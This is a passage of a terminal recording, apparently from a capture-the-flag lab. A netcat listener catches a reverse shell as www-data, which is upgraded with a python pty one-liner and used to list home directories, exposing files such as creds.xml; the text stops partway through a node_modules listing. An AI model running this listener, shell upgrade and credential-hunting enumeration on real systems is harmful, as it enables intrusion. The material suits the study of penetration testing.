@@ -1,0 +1,1040 @@
+Script started on 2026-10-04 17:28:19+03:00 [COMMAND="rlwrap nc -nlvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[K[K[?2004h        [K[?2004lconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 56550
+SOCKET: Shell has connected! PID: 3245
+[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpython -c 'import pty.[K;pty.so[Kpawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ip-10-80-141-176:/var/www/html/dev$ [Kwww-data@ip-10-80-141-176:/var/www/html/dev$ [K[?2004hwww-data@ip-10-80-141-176:/var/www/html/dev$ [7mls -lRta /home[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -lRta /home
+[Kls -lRta /home
+/home:
+total 24
+drwxr-xr-x 25 root         root         4096 Oct  4 14:33 ..
+drwxr-xr-x  3 ubuntu       ubuntu       4096 Oct  4 14:23 ubuntu
+drwxr-xr-x  6 root         root         4096 Oct  4 14:23 .
+drwxr-xr-x  2 ssm-user     ssm-user     4096 Jun 29  2025 ssm-user
+drwxr-xr-x  8 marston      marston      4096 May 29  2021 marston
+drwxr-xr-x  6 ArthurMorgan ArthurMorgan 4096 May 28  2021 ArthurMorgan
+
+/home/ubuntu:
+total 24
+drwx------ 2 ubuntu ubuntu 4096 Oct  4 14:23 .ssh
+drwxr-xr-x 3 ubuntu ubuntu 4096 Oct  4 14:23 .
+drwxr-xr-x 6 root   root   4096 Oct  4 14:23 ..
+-rw-r--r-- 1 ubuntu ubuntu  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 ubuntu ubuntu  807 Apr  4  2018 .profile
+ls: cannot open directory '/home/ubuntu/.ssh': Permission denied
+
+/home/ssm-user:
+total 20
+drwxr-xr-x 6 root     root     4096 Oct  4 14:23 ..
+drwxr-xr-x 2 ssm-user ssm-user 4096 Jun 29  2025 .
+-rw-r--r-- 1 ssm-user ssm-user  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ssm-user ssm-user 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 ssm-user ssm-user  807 Apr  4  2018 .profile
+
+/home/marston:
+total 52
+drwxr-xr-x 6 root    root    4096 Oct  4 14:23 ..
+drwxr-xr-x 8 marston marston 4096 May 29  2021 .
+-rw------- 1 marston root    2559 May 29  2021 hicckup.py
+-rw-r--r-- 1 root    root       6 Mar 23  2021 ideas
+lrwxrwxrwx 1 root    root       9 Mar 23  2021 .bash_history -> /dev/null
+drwx------ 2 marston marston 4096 Mar 23  2021 .ssh
+drwx------ 3 marston marston 4096 Mar 22  2021 .gnupg
+drwx------ 2 marston marston 4096 Mar 22  2021 .cache
+drwxr-xr-x 5 marston marston 4096 Mar 22  2021 app
+drwxr-x--- 3 marston marston 4096 Mar 21  2021 .config
+-rwxr-x--- 1 marston root     194 Mar 11  2021 run.sh
+drwxrwxr-x 3 marston marston 4096 Mar 11  2021 .local
+-rw-r--r-- 1 marston marston 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 marston marston  807 Apr  4  2018 .profile
+ls: cannot open directory '/home/marston/.ssh': Permission denied
+ls: cannot open directory '/home/marston/.gnupg': Permission denied
+ls: cannot open directory '/home/marston/.cache': Permission denied
+
+/home/marston/app:
+total 40
+drwxr-xr-x  8 marston marston 4096 May 29  2021 ..
+drwxr-xr-x  5 marston marston 4096 Mar 22  2021 .
+-rwxr-xr-x  1 marston marston 1705 Mar 22  2021 app.js
+drwxr-xr-x  3 marston marston 4096 Mar 21  2021 files
+drwxrwxr-x  2 marston marston 4096 Mar 21  2021 public
+-rw-r--r--  1 marston marston 1403 Mar 11  2021 app.js.save
+-rw-r--r--  1 marston marston 2416 Mar 11  2021 npm-debug.log
+-rw-r--r--  1 marston marston  630 Mar 11  2021 creds.xml
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 node_modules
+-rw-r--r--  1 marston marston  319 Mar  9  2021 package.json
+
+/home/marston/app/files:
+total 28
+drwxr-xr-x 5 marston marston  4096 Mar 22  2021 ..
+drwxr-xr-x 3 marston marston  4096 Mar 21  2021 .
+-rw-r--r-- 1 root    root    11162 Mar 21  2021 index.html
+-rw-rw-r-- 1 marston marston  1605 Mar  9  2021 login.html
+drwxrwxr-x 2 marston marston  4096 Mar  9  2021 stat
+
+/home/marston/app/files/stat:
+total 12
+drwxr-xr-x 3 marston marston 4096 Mar 21  2021 ..
+drwxrwxr-x 2 marston marston 4096 Mar  9  2021 .
+-rw-rw-r-- 1 marston marston 2316 Mar  9  2021 bootstrap.css
+
+/home/marston/app/public:
+total 16
+drwxr-xr-x 5 marston marston 4096 Mar 22  2021 ..
+drwxrwxr-x 2 marston marston 4096 Mar 21  2021 .
+-rw-r--r-- 1 root    root     756 Mar 21  2021 boot.css
+-rw-rw-r-- 1 marston marston 2316 Mar  9  2021 bootstrap.css
+-rw-rw-r-- 1 marston marston    0 Mar  9  2021 data.js
+
+/home/marston/app/node_modules:
+total 216
+drwxr-xr-x  5 marston marston 4096 Mar 22  2021 ..
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 express
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 xpath
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 body-parser
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 xmldom
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .bin
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 send
+drwxr-xr-x  4 marston marston 4096 Mar  9  2021 iconv-lite
+drwxr-xr-x  5 marston marston 4096 Mar  9  2021 qs
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 debug
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 mime
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 depd
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 mime-db
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 negotiator
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 safer-buffer
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 ipaddr.js
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 raw-body
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 setprototypeof
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 statuses
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 safe-buffer
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 vary
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 accepts
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 bytes
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 content-disposition
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 cookie
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 etag
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 finalhandler
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 fresh
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 http-errors
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 mime-types
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 on-finished
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 parseurl
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 path-to-regexp
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 proxy-addr
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 range-parser
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 serve-static
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 type-is
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 content-type
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 encodeurl
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 forwarded
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 inherits
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 media-typer
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 merge-descriptors
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 methods
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 unpipe
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 utils-merge
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 cookie-signature
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 ms
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 array-flatten
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 destroy
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 ee-first
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 toidentifier
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 escape-html
+
+/home/marston/app/node_modules/express:
+total 144
+drwxr-xr-x 54 marston marston   4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston   4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston   5691 Mar  9  2021 package.json
+drwxr-xr-x  4 marston marston   4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston 109589 Oct 26  1985 History.md
+-rw-r--r--  1 marston marston   1249 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston   4607 Oct 26  1985 Readme.md
+-rw-r--r--  1 marston marston    224 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/express/lib:
+total 92
+drwxr-xr-x 3 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 4 marston marston  4096 Mar  9  2021 .
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 router
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 middleware
+-rw-r--r-- 1 marston marston 14270 Oct 26  1985 application.js
+-rw-r--r-- 1 marston marston  2409 Oct 26  1985 express.js
+-rw-r--r-- 1 marston marston 12504 Oct 26  1985 request.js
+-rw-r--r-- 1 marston marston 27124 Oct 26  1985 response.js
+-rw-r--r-- 1 marston marston  5972 Oct 26  1985 utils.js
+-rw-r--r-- 1 marston marston  3326 Oct 26  1985 view.js
+
+/home/marston/app/node_modules/express/lib/router:
+total 36
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 .
+drwxr-xr-x 4 marston marston  4096 Mar  9  2021 ..
+-rw-r--r-- 1 marston marston 14883 Oct 26  1985 index.js
+-rw-r--r-- 1 marston marston  3296 Oct 26  1985 layer.js
+-rw-r--r-- 1 marston marston  4149 Oct 26  1985 route.js
+
+/home/marston/app/node_modules/express/lib/middleware:
+total 16
+drwxr-xr-x 4 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston  853 Oct 26  1985 init.js
+-rw-r--r-- 1 marston marston  885 Oct 26  1985 query.js
+
+/home/marston/app/node_modules/xpath:
+total 244
+drwxr-xr-x 54 marston marston   4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston   4096 Mar  9  2021 .
+drwxr-xr-x  2 marston marston   4096 Mar  9  2021 docs
+-rw-r--r--  1 marston marston   3202 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston   1098 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston   3523 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston  47999 Oct 26  1985 test.js
+-rw-r--r--  1 marston marston    625 Oct 26  1985 xpath.d.ts
+-rw-r--r--  1 marston marston 168463 Oct 26  1985 xpath.js
+
+/home/marston/app/node_modules/xpath/docs:
+total 36
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021  .
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021  ..
+-rw-r--r-- 1 marston marston 2030 Oct 26  1985  XPathEvaluator.md
+-rw-r--r-- 1 marston marston 1028 Oct 26  1985  XPathResult.md
+-rw-r--r-- 1 marston marston 2962 Oct 26  1985 'function resolvers.md'
+-rw-r--r-- 1 marston marston 1927 Oct 26  1985 'namespace resolvers.md'
+-rw-r--r-- 1 marston marston  803 Oct 26  1985 'parsed expressions.md'
+-rw-r--r-- 1 marston marston 2834 Oct 26  1985 'variable resolvers.md'
+-rw-r--r-- 1 marston marston 1934 Oct 26  1985 'xpath methods.md'
+
+/home/marston/app/node_modules/body-parser:
+total 64
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston  [Kdrwxr-xr-x  3 marston marston  [Kdrwxr-xr-x  3 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  4248 Mar  9  2021 package.json
+drwxr-xr-x  3 marston marston  4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston 15113 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston  1172 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 17100 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston  2656 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/body-parser/lib:
+total 16
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 types
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston 3894 Oct 26  1985 read.js
+
+/home/marston/app/node_modules/body-parser/lib/types:
+total 32
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+-rw-r--r-- 1 marston marston 4918 Oct 26  1985 json.js
+-rw-r--r-- 1 marston marston 1884 Oct 26  1985 raw.js
+-rw-r--r-- 1 marston marston 2285 Oct 26  1985 text.js
+-rw-r--r-- 1 marston marston 5797 Oct 26  1985 urlencoded.js
+
+/home/marston/app/node_modules/xmldom:
+total 48
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 5087 Mar  9  2021 package.json
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston 8706 Oct 26  1985 CHANGELOG.md
+-rw-r--r--  1 marston marston 1298 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 8275 Oct 26  1985 readme.md
+
+/home/marston/app/node_modules/xmldom/lib:
+total 88
+drwxr-xr-x 3 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston    36 Oct 26  1985 .eslintrc.yml
+-rw-r--r-- 1 marston marston  8232 Oct 26  1985 dom-parser.js
+-rw-r--r-- 1 marston marston 35585 Oct 26  1985 dom.js
+-rw-r--r-- 1 marston marston  4835 Oct 26  1985 entities.js
+-rw-r--r-- 1 marston marston 19317 Oct 26  1985 sax.js
+
+/home/marston/app/node_modules/.bin:
+total 8
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+lrwxrwxrwx  1 marston marston   14 Mar  9  2021 mime -> ../mime/cli.js
+
+/home/marston/app/node_modules/send:
+total 76
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston  4096 Mar  9  2021 .
+drwxr-xr-x  3 marston marston  4096 Mar  9  2021 node_modules
+-rw-r--r--  1 marston marston  4382 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 12643 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston  1128 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston  9442 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 23287 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/send/node_modules:
+total 12
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 ms
+
+/home/marston/app/node_modules/send/node_modules/ms:
+total 24
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston 2348 Mar  9  2021 package.json
+-rw-r--r-- 1 marston marston 3034 Nov 30  2017 index.js
+-rw-r--r-- 1 marston marston 2002 Nov 30  2017 readme.md
+-rw-r--r-- 1 marston marston 1077 Nov 30  2017 license.md
+
+/home/marston/app/node_modules/iconv-lite:
+total 40
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  4 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 encodings
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston 3679 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 4342 Aug 22  2018 Changelog.md
+-rw-r--r--  1 marston marston 6534 Aug 22  2018 README.md
+-rw-r--r--  1 marston marston 1064 Jan 18  2016 LICENSE
+
+/home/marston/app/node_modules/iconv-lite/encodings:
+total 124
+drwxr-xr-x 3 marston marston  4096 Mar  9  2021 .
+drwxr-xr-x 4 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 tables
+-rw-r--r-- 1 marston marston 21415 Aug 22  2018 dbcs-codec.js
+-rw-r--r-- 1 marston marston  8291 Aug 22  2018 dbcs-data.js
+-rw-r--r-- 1 marston marston   710 Aug 22  2018 index.js
+-rw-r--r-- 1 marston marston  6115 Aug 22  2018 internal.js
+-rw-r--r-- 1 marston marston  2191 Aug 22  2018 sbcs-codec.js
+-rw-r--r-- 1 marston marston 32034 Aug 22  2018 sbcs-data-generated.js
+-rw-r--r-- 1 marston marston  4686 Aug 22  2018 sbcs-data.js
+-rw-r--r-- 1 marston marston  5011 Aug 22  2018 utf16.js
+-rw-r--r-- 1 marston marston  9215 Aug 22  2018 utf7.js
+
+/home/marston/app/node_modules/iconv-lite/encodings/tables:
+total 236
+drwxr-xr-x 3 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston 17717 Jan 18  2016 big5-added.json
+-rw-r--r-- 1 marston marston 47320 Jan 18  2016 cp936.json
+-rw-r--r-- 1 marston marston 38122 Jan 18  2016 cp949.json
+-rw-r--r-- 1 marston marston 42356 Jan 18  2016 cp950.json
+-rw-r--r-- 1 marston marston 41064 Jan 18  2016 eucjp.json
+-rw-r--r-- 1 marston marston  2216 Jan 18  2016 gb18030-ranges.json
+-rw-r--r-- 1 marston marston  1227 Jan 18  2016 gbk-added.json
+-rw-r--r-- 1 marston marston 23782 Jan 18  2016 shiftjis.json
+
+/home/marston/app/node_modules/iconv-lite/lib:
+total 40
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x 4 marston marston 4096 Mar  9  2021 ..
+-rw-r--r-- 1 marston marston 1109 Aug 22  2018 bom-handling.js
+-rw-r--r-- 1 marston marston 8701 Aug 22  2018 extend-node.js
+-rw-r--r-- 1 marston marston  982 Aug 22  2018 index.d.ts
+-rw-r--r-- 1 marston marston 5123 Aug 22  2018 index.js
+-rw-r--r-- 1 marston marston 3387 Aug 22  2018 streams.js
+
+/home/marston/app/node_modules/qs:
+total 80
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  5 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  4142 Mar  9  2021 package.json
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 test
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston   399 Oct 26  1985 .editorconfig
+-rw-r--r--  1 marston marston     5 Oct 26  1985 .eslintignore
+-rw-r--r--  1 marston marston   647 Oct 26  1985 .eslintrc
+-rw-r--r--  1 marston marston 14655 Oct 26  1985 CHANGELOG.md
+-rw-r--r--  1 marston marston  1654 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 18228 Oct 26  1985 README.md
+drwxr-xr-x  2 marston marston  4096 Oct 26  1985 dist
+
+/home/marston/app/node_modules/qs/test:
+total 76
+drwxr-xr-x 5 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston   422 Oct 26  1985 .eslintrc
+-rw-r--r-- 1 marston marston    81 Oct 26  1985 index.js
+-rw-r--r-- 1 marston marston 27758 Oct 26  1985 parse.js
+-rw-r--r-- 1 marston marston 24073 Oct 26  1985 stringify.js
+-rw-r--r-- 1 marston marston  5096 Oct 26  1985 utils.js
+
+/home/marston/app/node_modules/qs/lib:
+total 48
+drwxr-xr-x 5 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston  387 Oct 26  1985 formats.js
+-rw-r--r-- 1 marston marston  211 Oct 26  1985 index.js
+-rw-r--r-- 1 marston marston 8492 Oct 26  1985 parse.js
+-rw-r--r-- 1 marston marston 8230 Oct 26  1985 stringify.js
+-rw-r--r-- 1 marston marston 6204 Oct 26  1985 utils.js
+
+/home/marston/app/node_modules/qs/dist:
+total 36
+drwxr-xr-x 5 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston  4096 Oct 26  1985 .
+-rw-r--r-- 1 marston marston 24660 Oct 26  1985 qs.js
+
+/home/marston/app/node_modules/debug:
+total 84
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  3135 Mar  9  2021 package.json
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 src
+-rw-r--r--  1 marston marston   321 Sep 22  2017 component.json
+-rw-r--r--  1 marston marston 11707 Sep 22  2017 CHANGELOG.md
+-rw-r--r--  1 marston marston   180 Sep 22  2017 .eslintrc
+-rw-r--r--  1 marston marston   140 Sep 22  2017 .travis.yml
+-rw-r--r--  1 marston marston  1059 Sep 22  2017 Makefile
+-rw-r--r--  1 marston marston 17918 Sep 22  2017 README.md
+-rw-r--r--  1 marston marston    46 Jun 15  2017 .coveralls.yml
+-rw-r--r--  1 marston marston    72 Jun 15  2017 .npmignore
+-rw-r--r--  1 marston marston  1107 Jun 15  2017 LICENSE
+-rw-r--r--  1 marston marston  1736 Jun 15  2017 karma.conf.js
+-rw-r--r--  1 marston marston    40 Jun 15  2017 node.js
+
+/home/marston/app/node_modules/debug/src:
+total 40
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston 6015 Sep 22  2017 node.js
+-rw-r--r-- 1 marston marston 4734 Sep 22  2017 browser.js
+-rw-r--r-- 1 marston marston 4394 Sep 22  2017 debug.js
+-rw-r--r-- 1 marston marston  263 Sep 22  2017 index.js
+-rw-r--r-- 1 marston marston  373 Sep 21  2017 inspector-log.js
+
+/home/marston/app/node_modules/mime:
+total 76
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  2567 Mar  9  2021 package.json
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 src
+-rw-r--r--  1 marston marston 31555 Nov 25  2017 types.json
+-rw-r--r--  1 marston marston  9473 Nov 25  2017 CHANGELOG.md
+-rw-r--r--  1 marston marston     0 Nov 25  2017 .npmignore
+-rw-r--r--  1 marston marston  2119 Nov 25  2017 README.md
+-rwxr-xr-x  1 marston marston   149 Nov 25  2017 cli.js
+-rw-r--r--  1 marston marston  2726 Nov 25  2017 mime.js
+-rw-r--r--  1 marston marston  1098 Nov 23  2017 LICENSE
+
+/home/marston/app/node_modules/mime/src:
+total 16
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+-rwxr-xr-x 1 marston marston 1351 Nov 25  2017 build.js
+-rw-r--r-- 1 marston marston 2334 Nov 25  2017 test.js
+
+/home/marston/app/node_modules/depd:
+total 48
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  2793 Mar  9  2021 package.json
+drwxr-xr-x  4 marston marston  4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston  2060 Jan 12  2018 History.md
+-rw-r--r--  1 marston marston  1094 Jan 12  2018 LICENSE
+-rw-r--r--  1 marston marston 10669 Jan 12  2018 index.js
+-rw-r--r--  1 marston marston 10025 Jan 12  2018 Readme.md
+
+/home/marston/app/node_modules/depd/lib:
+total 16
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 compat
+drwxr-xr-x 4 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x 2 marston marston 4096 Jul 27  2017 browser
+
+/home/marston/app/node_modules/depd/lib/compat:
+total 20
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+drwxr-xr-x 4 marston marston 4096 Mar  9  2021 ..
+-rw-r--r-- 1 marston marston 2229 Jan 12  2018 callsite-tostring.js
+-rw-r--r-- 1 marston marston 1421 Jan 12  2018 index.js
+-rw-r--r-- 1 marston marston  338 Jan 12  2018 event-listener-count.js
+
+/home/marston/app/node_modules/depd/lib/browser:
+total 12
+drwxr-xr-x 4 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Jul 27  2017 .
+-rw-r--r-- 1 marston marston 1512 Jul 27  2017 index.js
+
+/home/marston/app/node_modules/mime-db:
+total 224
+drwxr-xr-x 54 marston marston   4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston   4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston   4369 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  11555 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston   1099 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston   4102 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 181417 Oct 26  1985 db.json
+-rw-r--r--  1 marston marston    136 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/negotiator:
+total 36
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3849 Mar  9  2021 package.json
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston 2406 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1177 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 4811 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 3344 Oct 26  1985 index.js
+
+/home/marston/app/node_modules/negotiator/lib:
+total 28
+drwxr-xr-x 3 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston 4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston 3081 Oct 26  1985 charset.js
+-rw-r--r-- 1 marston marston 3506 Oct 26  1985 encoding.js
+-rw-r--r-- 1 marston marston 3408 Oct 26  1985 language.js
+-rw-r--r-- 1 marston marston 5358 Oct 26  1985 mediaType.js
+
+/home/marston/app/node_modules/safer-buffer:
+total 68
+drwxr-xr-x 54 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston  4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston  2523 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston  1094 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 12794 Oct 26  1985 Porting-Buffer.md
+-rw-r--r--  1 marston marston  8261 Oct 26  1985 Readme.md
+-rw-r--r--  1 marston marston  1483 Oct 26  1985 dangerous.js
+-rw-r--r--  1 marston marston  2110 Oct 26  1985 safer.js
+-rw-r--r--  1 marston marston 15735 Oct 26  1985 tests.js
+
+/home/marston/app/node_modules/ipaddr.js:
+total 44
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  3 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 3347 Mar  9  2021 package.json
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 lib
+-rw-r--r--  1 marston marston 1087 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 8309 Oct 26  1985 README.md
+-rw-r--r--  1 marston marston 9738 Oct 26  1985 ipaddr.min.js
+
+/home/marston/app/node_modules/ipaddr.js/lib:
+total 32
+drwxr-xr-x 3 marston marston  4096 Mar  9  2021 ..
+drwxr-xr-x 2 marston marston  4096 Mar  9  2021 .
+-rw-r--r-- 1 marston marston 19333 Oct 26  1985 ipaddr.js
+-rw-r--r-- 1 marston marston  2959 Oct 26  1985 ipaddr.js.d.ts
+
+/home/marston/app/node_modules/raw-body:
+total 48
+drwxr-xr-x 54 marston marston 4096 Mar  9  2021 ..
+drwxr-xr-x  2 marston marston 4096 Mar  9  2021 .
+-rw-r--r--  1 marston marston 4270 Mar  9  2021 package.json
+-rw-r--r--  1 marston marston 5354 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 marston marston 1181 Oct 26  1985 LICENSE
+-rw-r--r--  1 marston marston 6339 Oct 26  1985 README.md
